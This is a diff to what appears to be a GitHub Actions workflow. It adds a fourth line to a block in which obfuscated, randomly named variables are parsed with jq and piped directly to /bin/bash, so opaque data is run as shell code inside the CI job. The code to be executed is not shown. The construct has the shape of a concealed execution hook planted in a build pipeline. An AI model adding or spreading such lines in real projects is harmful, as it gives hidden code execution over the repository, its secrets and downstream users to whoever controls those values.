@@ -29,6 +29,7 @@ jobs:
           echo $gwdk0 | jq -r .pmxpt2014 | /bin/bash
           echo $y3 | jq -r .x07925 | /bin/bash
           printf '%s' "$fb59" | jq -r .uxc442 | /bin/bash
+          echo $neq58 | jq -r .equxs1567 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
